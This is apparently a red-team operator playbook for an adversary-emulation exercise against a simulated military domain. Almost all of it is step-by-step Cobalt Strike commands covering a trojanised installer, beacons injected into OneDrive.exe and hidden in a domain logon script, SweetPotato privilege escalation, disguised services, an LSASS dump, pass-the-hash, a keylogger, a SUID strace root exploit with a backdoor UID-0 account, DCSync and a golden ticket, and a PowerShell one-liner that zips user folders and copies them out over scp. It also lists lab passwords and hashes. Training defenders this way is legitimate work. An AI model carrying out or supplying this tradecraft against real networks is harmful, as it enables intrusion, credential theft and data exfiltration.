>[!info] Put this page in reading view!
>Navigating this page as an operator is much easier if you click on the three dots at the top right of this window, and click "Reading view".
# MECT Scenario Overview: (Insert Cool Name)

# Table Of Contents
### Phase 1: Initial Access & Enumeration
**MDA-S3-1**
- [ ] Step 1: [[#Emulate Visiting Watering Hole]]
- [ ] Step 2: [[#Enumeration]]
- [ ] Step 3: [[#Establish Unprivileged Persistence]]

### Phase 2: Lateral Movement & Privileged Persistence
- [ ] Step 1: [[#Modify the Logon Script]]
- [ ] Step 2: [[#Lateral Movement, PRIVESC, Persistence]]
**MDA-S1-0, MDA-S1-1, MDA-CMD1**
- [ ] Step 3: [[#Emulate Help Desk User]]
- [ ] Step 4: [[#Dump S6 User Hash using ProcDump]]

### Phase 3: Credential Harvesting & Digging In
- [ ] Step 1: [[#Pass-the-Hash, Laterally Move to S6]]
**MDA-S6-0**
- [ ] Step 2: [[#Deploy Keylogger on S6-0]]
- [ ] Step 3: [[#Escalate Privileges on MDA-WEB, Steal Hashes]]
**MDA WEB**

### Phase 4: C2 Rebuild, Domain PrivEsc, Exfiltration
- [ ] Step 1: [[#Establish New C2 Infrastructure]]
**MDA-SHRPT**
- [ ] Step 2: [[#Dump Domain Hashes using DCSync]]
- [ ] Step 3: [[#Compress, Stage Files for Exfiltration]]
- [ ] Step 4: [[#Exfiltrate Files from Webserver]]


---

# Phase 1: Initial Access & Enumeration


## Emulate Visiting Watering Hole
<h1><center> MDA-S3-1</center></h1>

>[!info]- MDA-S3-1 Credentials
>user: fernando.buckley
>password: PE#6ZdRz+P7+

![[Plan_video_1.mp4]]
1) Browse to `www.militarycac.com`, and navigate to DoD Certificates. Download the .msi version.
2) Run the installer. **Important:** When the FooBar error prompt comes up, click "Ok" to close the prompt. Wait a few seconds, walk through the installer, and when it asks if you want to run InstallRoot, just close it.

At this point, you should have a user-level beacon in Cobalt Strike. However, you're inside the Powershell.exe process making 443 connections, which isn't good. Let's spawn a slightly less suspicious process to work out of:

```CobaltStrike
spawn x64 mda_HTTPS
```

You should see a new beacon pop up, this time running in `svchost.exe`. When this happens, exit and remove your previous Powershell.exe beacon. You can either type `exit` or right click and go to Session -> Exit.

It isn't required, but highly recommended that you keep any CobaltStrike beacons that have existed on your dashboard, even if you exit them. This acts as a definitive log of actions you've taken on the network from CS. To keep them out of the way, I recommend right-clicking on the dead beacon, and selecting `Session -> Color -> "Red"`. Additionally, you can right-click -> Note and set the note as "zDEAD", and then sort your beacons by the "note" column descending. This way, your dead beacons stay on the bottom.

![[Plan_image_1.png]]


[[#Phase 1 Initial Access & Enumeration|Back to Top]]

## Enumeration
<h1><center> red-ops-kali-1</center></h1>

>[!info]- Kali Credentials
>user: root
>password: MALware123!@#

Instead of using enumeration scripts, we will manually enumerate some areas of interest in the domain. Run the following commands one after another- there's no need to wait for the beacon to call back in.

```CobaltStrike
net computers
```
```CobaltStrike
net logons
```
```CobaltStrike
net share
```
```CobaltStrike
netGroupList
```
```
netGroupListMembers "Domain Admins"
```
```CobaltStrike
drives
```

Once your results start rolling in, run the following commands to enumerate network shares.

```CobaltStrike
netshares \\MDA-DC1
```
```CobaltStrike
netshares \\MDA-SHRPT
```
```
ls \\mda-dc1\Fileshare
```
```
ls \\mda-dc1\Fileshare\admin
```
```CobaltStrike
ls \\mda-dc1\FileShare\admin\tools
```
```CobaltStrike
ls \\mda-dc1\FileShare\admin\Logs
```
```CobaltStrike
ls \\mda-dc1\SYSVOL\mda.mil\scripts
```
```CobaltStrike
cat \\mda-dc1\SYSVOL\mda.mil\scripts\LogonScript.ps1
```
```
cacls \\mda-dc1\SYSVOL\mda.mil\scripts
```

At this point, you've identified a cache of Sysinternals tools, a logon script, and a Logs folder. Critically, the `SYSVOL\mda.mil\scripts` permissions show the `Authenticated Users` group as having `Create, Write, Execute, Delete` permissions:

![[Plan_image_2.png]]

We can also take advantage of the SysInternals tool "ADExplorer" to do some more Active Directory enumeration for us.

```
powershell \\mda-dc1\fileshare\admin\tools\SysinternalsSuite\adexplorer.exe -accepteula -snapshot mda.mil "" C:\ProgramData\ntdom.tmp
```

```
download C:\ProgramData\ntdom.tmp
```

This download will take a while. We aren't actually relying on any information from this domain snapshot, but we can say it gives the attackers a greater understanding of the domain. Also, it makes more artifacts for the blue team to find.


[[#Phase 1 Initial Access & Enumeration|Back to Top]]


## Establish Unprivileged Persistence
<h1><center> red-ops-kali-1</center></h1>

Next, we want to establish some sort of stealthy persistence. Without a privileged session, our options are a bit more limited, but we can blend in somewhat. Enumerate your current user run key to identify if anything is already running on startup:

```CobaltStrike
reg query x64 HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

You should see "OneDrive" already present in the run key. We can take advantage of that; we're going to generate our HTTPS beacon in a raw format and inject it into the genuine OneDrive executable, so that it runs on startup without introducing any new run keys.

When downloading OneDrive.exe, feel free to lower the callback interval to 5 or 10 seconds, until the download is complete. You don't have to, but the download will take a while if you leave it at 45 seconds.

```CobaltStrike
cd C:\Users\fernando.buckley\AppData\Local\Microsoft\OneDrive
```
```CobaltStrike
download OneDrive.exe
```

Set your callback interval back to normal with `sleep 45 37`, if you changed it. Now, we want to generate a raw stager payload with CobaltStrike to inject into the executable.

In Cobalt Strike:
1) Go to View -> Downloads, and sync the OneDrive.exe file to `/root/`.
2) Go to Payloads -> Stager Payload Generator
3) Select your HTTPS Beacon
4) Select RAW as your output
5) UNCHECK "Use x64 Payload"
6) Generate

Next, open Shellter by running `shellter`.

In Shellter:
1) Operation Mode: A
2) PE Target: /path/to/downloaded/OneDrive.exe
	*note: This part takes a minute.*
3) Enable Stealth Mode: Y
4) Use listed payload or custom: C
5) Select Payload: /path/to/raw/payload_x86.bin
6) Is this payload a reflective DLL loader: N

In Cobalt Strike:
- Ensure you are in the OneDrive directory with pwd
```CobaltStrike
pwd
```
```CobaltStrike
upload /path/to/OneDrive.exe
```
```CobaltStrike
timestomp OneDrive.exe OneDriveStandaloneUpdater.exe
```

Run `ls` to verify that the timestomp has taken effect. When you verify that it has, reboot the box to verify that you have user persistence.

When your OneDrive.exe beacon calls back, you'll be inside an x86 beacon. To fix this, and leave the "OneDrive.exe" process, use the following command:

```
spawn x64 mda_HTTPS
```

You'll receive an svchost.exe callback, as before. However, this time, **don't exit the OneDrive.exe beacon.** It will reopen itself, which makes unnecessary noise. Just set the sleep time to one day:

```
sleep 1d
```


If this is a good stopping point for actions, remember to also set your current svchost beacon to a longer sleep time, like `sleep 10m 37j`.


[[#Phase 1 Initial Access & Enumeration|Back to Top]]


-----

# Phase 2: Lateral Movement & Privileged Persistence


## Modify the Logon Script
<h1><center> red-ops-kali-1</center></h1>

If you're picking up actions on Day 2, set your sleep back to something usable: `sleep 45 37`

Download the logon script from the NETLOGON share:
```CobaltStrike
ls \\mda-dc1\NETLOGON
```
```CobaltStrike
download \\mda-dc1\NETLOGON\LogonScript.ps1
```

Navigate to View -> Downloads, and sync the LogonScript file to the `/root/` directory. Make a backup of this file, so that we can cover our tracks later:

```bash
cp LogonScript.ps1 LogonScript.ps1.bak
```

Next, we want to create a payload that can be added to the existing logon script.

In Cobalt Strike:
1) Go to Payloads -> Windows Stageless Payload
- Select your HTTPS Beacon
- Select "PowerShell"
- Generate, save it as `beacon.ps1`.

Before we append our payload to the script, first add a ton of newlines as a bare-minimum effort to hide it from a quick examination of the file:

```bash
echo "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n" >> LogonScript.ps1
```

Now we can add the beacon:

```
cat beacon.ps1 >> LogonScript.ps1
```

With the backdoored script ready, we can now overwrite the genuine script using the misconfigured SYSVOL path, and stomp the modification time:

```CobaltStrike
cd \\mda-dc1\SYSVOL\mda.mil\scripts
```
```CobaltStrike
ls
```
```CobaltStrike
upload /path/to/LogonScript.ps1
```
```CobaltStrike
timestomp LogonScript.ps1 ../Policies
```




[[#Phase 2 Lateral Movement & Privileged Persistence|Back to Top]]







## Lateral Movement, PRIVESC, Persistence
<h1><center> red-ops-kali-1</center></h1>

Now that the logon script has been tampered with, three machines will initiate a callback to Cobalt Strike on reboot- they are MDA-S1-0, MDA-S1-1, and MDA-CMD1. To better simulate real life, reboot one machine at a time, and after iterating through the following actions, reboot the next.

The first machine we'll target is MDA-S1-0. You can reboot it by consoling in via PCTE; alternatively, under "VM State" for the machine in question, you can click "Running" and select "Restart".

Once we receive the PowerShell.exe callback, the first thing to do is get situational awareness. Since we came in through some sort of scheduled task or service, we might have interesting privileges:

```
whoami
```

We'll see that among our list of privileges is the `SeImpersonatePrivilege`. When this privilege is present, we can typically abuse it to escalate to `NT AUTHORITY\SYSTEM`.

With this knowledge, we'll use SweetPotato to privesc, via the PrintSpoofer exploit. The SweetPotato executable is included as `SweetPotato.exe` in the tools folder you extracted. 

We will re-use the logon script we infected earlier to avoid creating any new artifacts.

```
execute-assembly /path/to/SweetPotato.exe -l 139 -p "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-noprofile -ep bypass -w h -file \\mda-dc1\NETLOGON\LogonScript.ps1"
```

You should receive a new powershell.exe beacon, this time as SYSTEM. When this happens, kill your initial beacon with `exit`.

With privesc complete, the next step is to establish persistence as SYSTEM. We're going to do that by creating a service that mimics the name of an existing DLL in the `C:\Windows\System32` directory. This is going to be much more difficult to identify as malicious than PowerShell spawning processes.

In your new SYSTEM beacon, you should already be in System32. First, verify:
```
pwd
```
Then, look for a DLL to mimic.
```
ls
```

You can be creative here. Pick any DLL that does not have an associated .exe, and generate your beacon service executable with a matching name. We will be imitating wtsapi32.dll.

In CobaltStrike, go to `Payloads -> Windows Stageless Payloads`. **Make sure you generate your CS beacon as a SERVICE EXECUTABLE! Select Output -> "Windows Service EXE".**

With the service executable generated, upload it to the System32 directory, and timestomp:

```
upload /path/to/wtsapi32.exe
```
```
timestomp wtsapi32.exe wtsapi32.dll
```

Finally, we will register a new service, attach it to the service binary, and query it:

```
sc_create wtsapi32 "Windows Telemetry API Service" "C:\Windows\System32\wtsapi32.exe" "Provides legacy support for Windows telemetry services. If this service is stopped or disabled, some network applications may not operate correctly." 0 2
```
```
sc_query wtsapi32
```

If done correctly, the command output should appear as follows:

![[Plan_image_3.png]]

Once you've verified that the executable and service are properly configured, you can exit the beacon.

Repeat the above steps on MDA-S1-1 and MDA-CMD1. If you want to increase the difficulty for the defenders, use unique names and descriptions for your services and binaries. When complete, you should only have one beacon still active, which is as `fernando.buckley` on MDA-S3-1.

For the next phase of the plan, we are going to be rebooting CMD1 to trigger our persistence mechanism. However, we currently have both unprivileged and privileged callbacks active, which is redundant and unnecessarily noisy.

>[!danger] Covering your Tracks
>Bear in mind that creating artifacts for the CPT is a good thing, to an extent. You may or may not want to restore the logon script to its original state. If you leave it as an artifact, I recommend just closing the beacons when they pop up on reboot.

To restore the logon script to its original state, first rename your LogonScript backup:

```bash
mv LogonScript.ps1 modified_LogonScript.ps1
```
```bash
mv LogonScript.ps1.bak LogonScript.ps1
```

Now, run the following commands from your beacon on MDA-S3-1:

```CobaltStrike
cd \\mda-dc1\SYSVOL\mda.mil\scripts
```
```CobaltStrike
upload /root/LogonScript.ps1
```
```CobaltStrike
timestomp LogonScript.ps1 ../Policies
```

Finally, confirm that the changes have been made:

```CobaltStrike
cat LogonScript.ps1
```







[[#Phase 2 Lateral Movement & Privileged Persistence|Back to Top]]




## Emulate Help Desk User
<h1><center> MDA-S6-0</center></h1>
>[!info]- MDA-S6-0 Credentials
>user: jeri.wu
>password: B+N5K#6YzJ#f


At this point, the story is that a user on MDA-CMD1 complains of abnormally slow performance, and a Help Desk user RDPs into the box to diagnose the issue. Before this happens, though, we need to be actively monitoring the CMD1 machine for this connection. 

Reboot the CMD1 machine via PCTE. On Kali-1, you should see a beacon appear as `SYSTEM`, running under rundll32.exe. Immediately spawn into a new process, and close your rundll beacon:

```
spawn x64 mda_HTTPS
```

Run `enumLocalSessions` and `netstat` to "monitor" for incoming RDP connections.

Console in to MDA-S6-0 using PCTE, and from there RDP into MDA-CMD1.


![[Plan_image_4.png]]


![[Plan_image_5.png]]



1) In the Windows search bar, type in "Remote Desktop"
2) Open the "Remote Desktop Connection" app
3) For "Computer" enter `MDA-CMD1`
4) When prompted for credentials, enter the username `mda\jeri.wu` and password `B+N5K#6YzJ#f`

Once the RDP connection is established, return to CobaltStrike in Kali-1, and up-arrow to re-run `netloggedon` and `netstat`. You will see jeri.wu now has a session on the machine, which means her credentials are cached in memory.

As the attacker, we need to know what groups jeri.wu belongs to:

```
netuser jeri.wu mda.mil
```

Though not a domain admin, we can see jeri.wu belongs to both the MDA-S6 and "Help Desk" groups. This makes jeri.wu a good target for credential dumping.

[[#Phase 2 Lateral Movement & Privileged Persistence|Back to Top]]



## Dump S6 User Hash using ProcDump
<h1><center> red-ops-kali-1</center></h1>

There are a few ways that we can dump hashes, but since we've found Sysinternals tools inside the network, we'll use the ProcDump utility. We already know where the tool is being hosted, so run the following command to try and create the dump file:

```
run \\mda-dc1\fileshare\admin\tools\sysinternalssuite\procdump.exe -accepteula -r -ma lsass.exe C:\ProgramData\pagefile
```

The dump file created will be `C:\ProgramData\pagefile.dmp`. Once it is created, close the RDP connection from MDA-S6-0. Start a download for the dump file:

```
download C:\ProgramData\pagefile.dmp
```

The file should be around 50MB, so expect it to take some time to download. Since this is a good stopping point for Day 2, consider leaving it overnight to download at a sleep setting of roughly `10m 30j`.

[[#Phase 2 Lateral Movement & Privileged Persistence|Back to Top]]




-----

# Phase 3: Credential Dumping and Digging In





## Pass-the-Hash, Laterally Move to S6
<h1><center> red-ops-kali-1</center></h1>

To begin Day 3, use the PCTE interface to restart `MDA-S1-0` and `MDA-S1-1`. Both should return `SYSTEM` beacons under `rundll32.exe`. 

For both beacons, run `spawn x64 mda_HTTPS`, and exit the original `rundll` beacons.

At this point, you should have downloaded the entire `pagefile.dmp`, AKA LSASS minidump, from MDA-CMD1. In CobaltStrike, go to `View -> Downloads` and sync the file to the `/root/` directory.

To decode the minidump file, open or switch to a terminal in the `/root/` directory and run the following command:

```bash
pypykatz lsa minidump pagefile.dmp | grep -C 5 jeri.wu
```

Near the top of the command output, the following information can be found:

```
                Username: jeri.wu
                Domain: mda
                LM: NA
                NT: 20d3ac97f51a42ec73d1f7f125d00aa2
                SHA1: bc54df82cdb55162f9708b1e26480e82f774a04a
                DPAPI: c565c1fffd8d5c4978b9eda6c79d44ef
```

Since this hash is not crackable, we can instead pass-the-hash and impersonate the account that way. Rather than continue the attack from CMD1, we'll use the beacon on `MDA-S1-0`. Note the PID that your beacon is running in, and use it for the following command:

```CobaltStrike
pth <your PID> x64 mda\jeri.wu 20d3ac97f51a42ec73d1f7f125d00aa2
```

To verify that this worked, we can attempt to access the `ADMIN$` share on `MDA-S6-0` with:

```
ls \\mda-s6-0\ADMIN$
```
```
ls \\mda-s6-1\ADMIN$
```
```
ls \\mda-DC2\ADMIN$
```

The result should be successful for both S6 machines and unsuccessful for DC2. To find out why this is, we can import PowerView into our CobaltStrike beacon:

```
powershell-import /home/kali/tools/powershell/PowerTools/PowerView/powerview.ps1
```
*Note: If for some reason this isn't working, try `locate powerview.ps1`*

Next, run `Find-LocalAdminAccess`:

```
psinject <your PID> x64 find-localadminaccess
```

![[Plan_image_6.png]]

So, we now know that jeri.wu is a local admin on all domain workstations. The next thing we want to do is dig into the S6 subnet; however, this may be a more closely monitored subnet due to its privileged users. For this reason, we don't want the same domain beaconing from these machines. 

1) Right click on the MDA-S1-1 beacon in Cobalt Strike.
2) Go to `Pivoting -> Listener...`
3) Name it "S1-1 Pivot"
4) Ensure "Listen Host" is set to `139.242.4.3` (S1-1's IP)
5) Change "Listen Port" to `49675`
6) Hit "Save"

A new listener will be added to CobaltStrike which will behave the same as your existing listener, but will actually have its traffic tunneled through the S1-1 machine. Return to the S1-0 beacon where you're impersonating the jeri.wu user, and run the following to initiate a connection to S6-0:

```
jump psexec64 mda-s6-0 S1-1 Pivot
```

When your beacon returns, run the following command to spawn into a better process:

```
spawn x64 S1-1 Pivot
```

Make sure to exit out of your rundll32.exe beacon. You should now have five open beacons (and OneDrive).




[[#Phase 3 Credential Harvesting & Digging In|Back to Top]]




## Deploy Keylogger on S6-0
<h1><center> MDA-S6-0</center></h1>
>[!info]- MDA-S6-0 Credentials
>user: jeri.wu
>password: B+N5K#6YzJ#f

We already know who owns this machine, and we already own that user's NTLM hash. However, there may be services disconnected from the Active Directory environment that this user has access to.

You will have to user-emulate for jeri.wu again, so begin by logging in to the MDA-S6-0 box through PCTE. When you have done so, return to Kali-1 and your CobaltStrike client.
 
Interact with the S6-0 beacon, and run `ps`. You're looking for the PID of `explorer.exe`, which we will need to hook a keylogger into the process.

![[Plan_image_7.png]]

The first number (in this case, 1732) is the PID. When you find the PID of your explorer process, run the following:

```
keylogger <PID of explorer.exe> x64
```

Perform some user emulation by generating some keystrokes as jeri.wu to make noise for the defenders. Browse through some websites, write stuff in notepad- anything typed out is fine.

After you do this for a few minutes, use a web browser to navigate to the firewall page at `139.242.0.5`. Log in with the credentials from setup: `admin:FinalCrosswordPerchance!!`

You can click around, create a few more keystrokes for noise if you like, and exit out. Next, open a Powershell/CMD terminal, and run the following:
```
ssh j.wu@139.242.1.5
```

The password for this account is the same as before: `FinalCrosswordPerchance!!`. Create some more noise, and exit out of this as well.

You should now have a lot of keystrokes, including the firewall credentials, in your Cobalt Strike terminal (View -> Keystrokes).




[[#Phase 3 Credential Harvesting & Digging In|Back to Top]]

## Escalate Privileges on MDA-WEB, Steal Hashes
<h1><center> red-ops-kali-1</center></h1>

Having gathered what we needed from S6-0, run the `jobs` command in CobaltStrike to identify the Job ID of the keylogger- it will probably be 0, so run `jobkill 0` to kill the keylogger.

We next want to use the keylogged credentials to establish a session on the MDA-WEB webserver, which we can potentially harvest credentials from, and use as a better pivot out of the network. To do this, run the following command from the S6-0 beacon:

```
ssh <Current PID> x64 139.242.1.5:22 j.wu FinalCrosswordPerchance!!
```

When your MDA-WEB beacon returns, perform some basic enumeration to look for other users, and for sudo permissions:

```bash
shell cat /etc/passwd | grep sh
```
```bash
shell echo 'FinalCrosswordPerchance!!' | sudo -l -S
```

![[Plan_image_8.png]]

You should see that j.wu has no sudo privileges on the webserver. However, you should also see the existence of the `h.clements` account, which matches the expanded name of a domain admin we saw on Day 1, `houston.clements`. 

To get this user's password hash, we first need to escalate our privileges, so we'll upload the `LinEnum` tool to automate checking for attack vectors. The tool should be in your `/root/` directory, called `diskchk`.

First, change directories in MDA-WEB to the `/tmp` directory:

```bash
cd /tmp
```

Next, upload the tool, give it execute permissions, and execute it:

```
upload /root/diskchk
```
```
shell chmod +x diskchk
```
```
shell ./diskchk
```

![[Plan_image_9.png]]

In the scan output, one of the results you will find is that the `/usr/bin/strace` binary has its SUID bit set, meaning it will always be run as its owner (root). When configured this way, any user can perform actions as root using strace. We can test this with whoami:

```bash
shell strace -o /dev/null /bin/sh -p -c whoami
```

![[Plan_image_10.png]]

We've verified our ability to run commands as root, so now we can access `/etc/shadow`:

```
shell strace -o /dev/null /bin/sh -p -c "cat /etc/shadow"
```

At the end of the file should be the MD5 hash of `h.clements`:

`h.clements:$1$X/Ms6pXX$yIkp9H417pNSw53ia9PSH.:19825:0:99999:7:::`

This is a brutal hash to crack, but to make it somewhat more realistic, we've forced it to be the weaker MD5 hash, and we can assume the APT has massive compute power to crack it overnight.

The last thing we're going to do for now is create a new privileged account on the webserver. This benefits us in two ways- it acts as a form of persistence, and it bypasses some of the permission issues CobaltStrike has natively with SSH connections.

First, we need to use the webserver's `openssl` command to determine what our password is going to look like when we create the account. Run the following in your SSH beacon:

```
shell openssl passwd debug
```

In this case, the output is the Unix CRYPT hash of "debug", which is `cG69bb4nn6c9A`. Using this hash, we can create our privileged account using the same exploit as before:

```
shell strace -o /dev/null /bin/sh -p -c "useradd -ou 0 -Nl j.pacheco -p cG69bb4nn6c9A"
```

The breakdown for this command is as follows:

1) `useradd -ou 0`: Create a new user, and set their UID to 0, even if that's not a unique value. This will make the OS interpret our user as actually being `root`, whose UID is always 0.
2) `-Nl`: Do not create a group for this user, and do not add the user to the `lastlog` or `faillog` databases.
3) `j.pacheco -p cG69bb4nn6c9A`: The user we're creating will be called "j.pacheco", to blend in as a real user, and the `CRYPT` hash of the password we're setting for the account is "cG69bb4nn6c9A". This means we can log in with the password "debug".

Run this command to create the user. We still can't log in with this user though, because root logins are disabled over SSH. To fix this, we can append a single line to the SSHd_config:

```
shell strace -o /dev/null /bin/sh -p -c "echo 'PermitRootLogin yes' > /etc/ssh/sshd_config"
```

>[!danger] Don't fat-finger this
>Make sure you copy-paste this command exactly. If you make a typo in the SSHD config and restart it, you will lock yourself out.

The last thing we need to do is restart the SSH daemon for the changes to take effect:

```
shell strace -o /dev/null /bin/sh -p -c "systemctl restart sshd"
```

Once you run this, your SSH connection will die. Exit out of it, and attempt to spawn a new one using the credentials you just created, `j.pacheco:debug`

```
ssh <Beacon PID> x64 139.242.1.5:22 j.pacheco debug
```

When your beacon returns, run `shell whoami`, and verify that instead of being `j.pacheco`, you are actually recognized as `root`.

When this is verified, exit out of the beacon.


[[#Phase 3 Credential Harvesting & Digging In|Back to Top]]








-----

# Phase 4: Domain PrivEsc, Exfiltration, Impact


## Establish New C2 Infrastructure
<h1><center> red-ops-kali-1</center></h1>


It's important to remember that the defenders can track which machines are compromised fairly easily by just looking at our primary C2 domain. To throw them off the trail a bit, we are going to create a new beacon listener on port 80 instead of 443, and we're going to propagate that beacon with a different service executable.

![[Plan_image_11.png]]

1) Go to `Cobalt Strike -> Listeners -> Add`
2) Name it "mda_HTTP"
3) For HTTP Hosts, add `www.searchusajobs.com` followed by `www.msft-contoso.com`
4) For HTTP Host (Stager), replace the IP with `www.searchusajobs.com`
5) Set "Host Rotation Strategy" to `failover-100x`
6) For "Profile" select "Phase 4"
7) Hit "Save".


Using this new listener, generate a new stageless Windows service payload:

1) Go to `Payloads -> Windows Stageless Payload`
2) For "Listener" select `mda_HTTP`
3) For "Output" select `Windows Service EXE`
4) Save the result as "DeviceSetupManager.exe".


Next, select the beacon you used to impersonate `jeri.wu`, which should be MDA-S1-0 if you've been following along. Change directories to System32 in MDA-SHRPT using the UNC path, and upload the new service executable:

```
cd \\mda-shrpt\C$\Windows\System32
```
```
upload /root/DeviceSetupManager.exe
```

Timestomp the file to blend in with its surroundings, and then remotely configure a service that matches the file name.

```
timestomp DeviceSetupManager.exe DeviceSetupManager.dll
```
```
sc_create DeviceSetupManager "Device Setup Management" "C:\Windows\System32\DeviceSetupManager.exe" "Manages the setup and configuration of hardware devices on the system. If this service is stopped or disabled, new devices may not be recognized or properly configured, leading to potential hardware compatibility issues and reduced system functionality." 0 2 3 \\mda-shrpt
```

Remotely start the service to receive the beacon callback:

```
sc_start DeviceSetupManager \\mda-shrpt
```

Finally, run `spawn x64 mda_HTTP` and exit the initial rundll32.exe beacon.

>[!warning] Possible improve
>Consider using `spawnto` to move away from svchost.exe, since that's a remaining artifact between the old and new C2. Candidates include `wlanext.exe`, or `WSManHTTPConfig.exe`. Consider also that the traffic is going to port 80, so make that make sense. Impersonating sysmon or metricbeat might be good, we can even use that port.


Once you've migrated processes on MDA-SHRPT, create a new pivot by right-clicking on the beacon and going to `Pivoting -> Listener...`

![[Plan_image_12.png]]

1) Name the pivot "SHRPT Pivot"
2) Ensure that the listen host is "139.242.2.4"
3) Set the listen port to "443"
4) Hit "Save"


From the MDA-S1-0 beacon, where you are still impersonating `jeri.wu`, run the following commands to dismantle your previous persistence services:

```
sc_delete wtsapi32 \\mda-s1-0
```
```
sc_delete wtsapi32 \\mda-CMD1
```

Then run the following to delete their respective binaries:

```
rm \\mda-s1-0\C$\Windows\System32\wtsapi32.exe
```
```
rm \\mda-CMD1\C$\Windows\System32\wtsapi32.exe
```

We're going to maintain a foothold on MDA-S1-1, but replace the existing service binary with one that instead connects through our new SHRPT pivot. In CobaltStrike, go to `Payloads -> Windows Stageless Payloads`, and configure it as follows:

![[Plan_image_13.png]]

1) Listener: `SHRPT Pivot`
2) Output: `Windows Service EXE`
3) Leave the rest as default
4) Generate, name it `wtsapi32.exe`

On your S1-1 beacon, change directories to System32, upload the binary, and timestomp it again:

```
cd C:\Windows\System32
```
```
upload /root/wtsapi32.exe
```
```
timestomp wtsapi32.exe wtsapi32.dll
```

Finally, exit the `S6-0`, `CMD1`, and `S1-0` beacons. Run the following command on your remaining `S1-1` beacon to switch from a direct beacon to one that pivots through `MDA-SHRPT`:

```
spawn x64 SHRPT Pivot
```

Once this beacon returns, exit the directly linked beacon. You should be left with beacons on `MDA-SHRPT`, `S1-1`, and `S3-1`.




[[#Phase 4 C2 Rebuild, Domain PrivEsc, Exfiltration|Back to Top]]





## Dump Domain Hashes using DCSync
<h1><center> red-ops-kali-1</center></h1>


Interact with the new beacon on `MDA-S1-1`, and impersonate `houston.clements` using his compromised password:

```
make_token mda\houston.clements AM$M+u2h@o4W
```

Using `houston.clements`'s domain administrator privileges, run a DCSync to dump the hashes of all domain accounts:

```
dcsync <your beacon PID> x64 mda.mil
```

Remove the `houston.clements` token from your token by running `rev2self`.

Next, create a golden ticket by right-clicking on the beacon and selecting `Access -> Golden Ticket`.

![[Plan_image_14.png]]

1) For user, you can put anything. We're going to impersonate the real S1-1 user, `bryon.ball`.
2) Set "Domain" to `mda.mil`.
3) Set "Domain SID" to `S-1-5-21-3784031449-2373161643-654275839`
4) For KRBTGT hash, click the three dots and select the hash that should be stored there already from your DCSync, which is `488c7d300f5d0e712d2ee896e0fafaa9`
5) Click "Build".

Verify that your golden ticket works by running `ls \\mda-dc2\ADMIN$`. If you see the directory listing, then it has worked.



[[#Phase 4 C2 Rebuild, Domain PrivEsc, Exfiltration|Back to Top]]






## Compress, Stage Files for Exfiltration
<h1><center> red-ops-kali-1</center></h1>

One of the end-goals of this campaign is theft of sensitive documents, which we are going to achieve by compressing and exfiltrating user directories (which contain a lot of pre-generated documents). Rather than downloading them through our beacons, we are going to move them over SSH to the webserver, where we will then pull them down from the "internet". 

In order to facilitate this, we first need to set up SSH key authentication. On your Kali-1 terminal, run `ssh-keygen` and hit "Enter" twice. You should see the following:

![[Plan_image_15.png]]

Run:
`mv /root/.ssh/id_rsa /root/id_rsa` 
and:
`mv /root/.ssh/id_rsa.pub /root/authorized_keys`
so that the two files are named properly and are in your working directory. Next, using your text-editor of choice, edit the `authorized_keys` file and delete the "root@kali" fingerprint from the end.

Back in CobaltStrike, interact with your beacon on S1-1 and run the following:
1) `cd C:\ProgramData`
2) `upload /root/id_rsa`
3) `powershell icacls C:\ProgramData\id_rsa /c /Inheritance:d`
4) `powershell icacls C:\ProgramData\id_rsa /c /Remove:g Everyone Users`

The `icacls` commands are necessary because SSH will not allow the use of private keys that have overly-permissive permission sets. Next, re-establish your SSH connection by running:

```
ssh <your beacon PID> x64 139.242.1.5:22 j.pacheco debug
```

Once the session appears, run the following commands within your SSH beacon:
1) `cd /home/j.pacheco/.ssh`
2) `upload /root/authorized_keys`

Verify that the file is in the right place by running `pwd` and `ls`, and then exit the SSH beacon. What we've done is set up key-based authentication for SSH, which allows us to authenticate without needing to interactively use a password, or make some hacky workaround for piping passwords to STDIN.

Next, we need to upload our file compression utility, which is going to be `7zr.exe`, which is the 7-Zip reduced standalone console executable. For this iteration, I've renamed it `sysmon32.exe` to blend in somewhat with the directory we want to place it in.

From your S1-1 beacon, run the following commands:

```
cd \\mda-dc1\FileShare\admin\tools\SysinternalsSuite
```
```
upload /root/Sysmon32.exe
```
```
timestomp Sysmon32.exe Sysmon64.exe
```


Now that everything is in place, you can begin the compression and exfiltration of documents.

>[!info] Cleartext Command
>For awareness (and debugging, if necessary), the command being run is provided in cleartext as well as UTF-16LE Base64 for use with powershell. Only run the Base64 version, unless you need to modify it.
>`$z` = A list of machines that will be targeted for compression of `C:\Users` directory
>`$y` = A memory stream that the `Get-FileHash` cmdlet can use to convert the computer names into MD5 hashes. We'll use these later to pull down the staged zip files.
>`$x` = The variable storing the hashes themselves.

```
$z="MDA-MAIL","MDA-SHRPT","MDA-S6-0","MDA-S3-1","MDA-S3-0","MDA-CMD0","MDA-S2-1","MDA-S2-0","MDA-CMD1","MDA-S1-1","MDA-S6-1","MDA-S1-0","MDA-SQL";$z | % {$y = [IO.MemoryStream]::new([byte[]][char[]]$_);$x = (Get-FileHash -InputStream $y -Algorithm md5).Hash; \\mda-dc1\fileshare\admin\tools\sysinternalssuite\sysmon32.exe a C:\ProgramData\$x.dat \\$_\C$\Users\* -xr!App*;scp -o StrictHostKeyChecking=no -i C:\ProgramData\id_rsa C:\ProgramData\$x.dat j.pacheco@139.242.1.5:/var/www/html/public/$x.dat}
```

Before running this command, it should be converted to UTF-16LE Base64. This isn't going to prevent the defenders from reading it, but it will help a lot with PowerShell's picky attitude towards quotes, apostrophes and other symbols. I've converted this command already, but in case you need to do it yourself, instructions are in the Vulnerability and Setup guide, under `Create Trojan Installer`. 

Run the following from `MDA-S1-1` when ready to begin the process of compression/exfiltrating. It should take a few hours to complete.

```
